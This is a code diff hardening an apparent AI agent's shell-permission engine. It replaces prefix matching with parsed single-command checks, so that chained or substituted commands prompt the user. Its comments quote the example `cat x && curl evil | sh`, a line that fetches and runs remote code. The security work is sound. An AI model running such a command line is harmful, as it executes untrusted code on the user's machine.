@@ -1,9 +1,9 @@
 #include "core/perm.h"
+#include "core/shlex.h"
 #include "util/util.h"
 
 #include <stdlib.h>
 #include <string.h>
-#include <stdio.h>
 
 static const char *SAFE_TOOLS[] = {"list_files",        "glob_files",
                                    "grep_files",        "read_file",
@@ -41,14 +41,48 @@ void perm_free(perm_engine *p) {
 
 int perm_grant_count(perm_engine *p) { return p->n_grants; }
 
+/* Map a tool name onto a rule category used in settings.json:
+ * "bash" for terminal, "edit" for write-ish file tools, else tool name. */
+static const char *rule_category(const char *tool) {
+    if (strcmp(tool, "terminal") == 0 || strcmp(tool, "run_command") == 0) return "bash";
+    if (strcmp(tool, "write_file") == 0 || strcmp(tool, "edit_file") == 0 ||
+        strcmp(tool, "delete_file") == 0 || strcmp(tool, "rename_file") == 0 ||
+        strcmp(tool, "copy_file") == 0 || strcmp(tool, "create_folder") == 0)
+        return "edit";
+    return tool;
+}
+
+/* Programs whose first subcommand decides what they do. A grant for
+ * `git status` must not cover `git push` (docs/adr/0059). */
+static bool multi_verb(const char *prog) {
+    static const char *progs[] = {"git", "npm", "cargo", "make", "docker", "gh", NULL};
+    for (int i = 0; progs[i]; i++)
+        if (strcmp(prog, progs[i]) == 0) return true;
+    return false;
+}
+
+/* Session-grant key for a shell command. A single simple command keys on its
+ * program (plus subcommand for multi-verb programs). Anything carrying shell
+ * machinery — chaining, redirection, substitution, an env prefix, unbalanced
+ * quotes — keys on the exact line, so "don't ask again" for
+ * `cat x && curl evil | sh` authorizes that line and nothing else. */
+static void grant_key_bash(buf_t *b, const char *detail) {
+    shlex_cmd c;
+    shlex_parse(detail, &c);
+    const char *prog = shlex_is_simple(&c) ? shlex_program(&c) : NULL;
+    if (!prog) {
+        buf_appendf(b, "bash!%s", detail); /* exact command line */
+        return;
+    }
+    if (c.verb[0] && multi_verb(prog)) buf_appendf(b, "bash:%s %s", prog, c.verb);
+    else buf_appendf(b, "bash:%s", prog);
+}
+
 static char *grant_key(const char *tool, const char *detail) {
     buf_t b;
     buf_init(&b);
-    if (strcmp(tool, "terminal") == 0 && detail) {
-        /* grant covers the same leading program */
-        char prog[128] = {0};
-        sscanf(detail, "%127s", prog);
-        buf_appendf(&b, "terminal:%s", prog);
+    if (detail && strcmp(rule_category(tool), "bash") == 0) {
+        grant_key_bash(&b, detail);
     } else if (detail && *detail) {
         buf_appendf(&b, "%s:%s", tool, detail);
     } else {
@@ -85,17 +119,6 @@ static bool grant_hit(perm_engine *p, const char *tool, const char *detail) {
         }
     free(key);
     return hit;
-}
-
-/* Map a tool name onto a rule category used in settings.json:
- * "bash" for terminal, "edit" for write-ish file tools, else tool name. */
-static const char *rule_category(const char *tool) {
-    if (strcmp(tool, "terminal") == 0 || strcmp(tool, "run_command") == 0) return "bash";
-    if (strcmp(tool, "write_file") == 0 || strcmp(tool, "edit_file") == 0 ||
-        strcmp(tool, "delete_file") == 0 || strcmp(tool, "rename_file") == 0 ||
-        strcmp(tool, "copy_file") == 0 || strcmp(tool, "create_folder") == 0)
-        return "edit";
-    return tool;
 }
 
 /* Look up rules in one permission object. Returns -1 none, 0 deny, 1 allow,
@@ -163,11 +186,23 @@ sensitive:;
         const char *cat = rule_category(tool);
         if (strcmp(cat, "edit") == 0 && detail && perm_path_allowed(ctx, detail)) return PERM_ALLOW;
         if (strcmp(cat, "bash") == 0 && detail) {
-            static const char *safe_prog[] = {
-                "ls", "cat",        "head",    "tail",     "grep",     "rg", "find",
-                "wc", "git status", "git log", "git diff", "git show", NULL};
-            for (int i = 0; safe_prog[i]; i++)
-                if (str_starts(detail, safe_prog[i])) return PERM_ALLOW;
+            /* Only ONE simple command may be auto-allowed. Chaining,
+             * substitution, redirection, env prefixes and exec-capable
+             * options fail closed to a prompt (docs/adr/0059): a prefix
+             * match would have allowed `cat x && curl evil | sh`. */
+            shlex_cmd c;
+            shlex_parse(detail, &c);
+            const char *prog = shlex_is_simple(&c) && !c.dangerous_opt ? shlex_program(&c) : NULL;
+            if (prog) {
+                static const char *safe_prog[] = {"ls",   "cat", "head", "tail", "wc",
+                                                  "grep", "rg",  "find", NULL};
+                for (int i = 0; safe_prog[i]; i++)
+                    if (strcmp(prog, safe_prog[i]) == 0) return PERM_ALLOW;
+                static const char *safe_git[] = {"status", "log", "diff", "show", NULL};
+                if (strcmp(prog, "git") == 0)
+                    for (int i = 0; safe_git[i]; i++)
+                        if (strcmp(c.verb, safe_git[i]) == 0) return PERM_ALLOW;
+            }
         }
         if (strcmp(tool, "web_fetch") == 0 || strcmp(tool, "web_search") == 0 ||
             strcmp(tool, "vision") == 0 || strcmp(tool, "open_file") == 0 ||
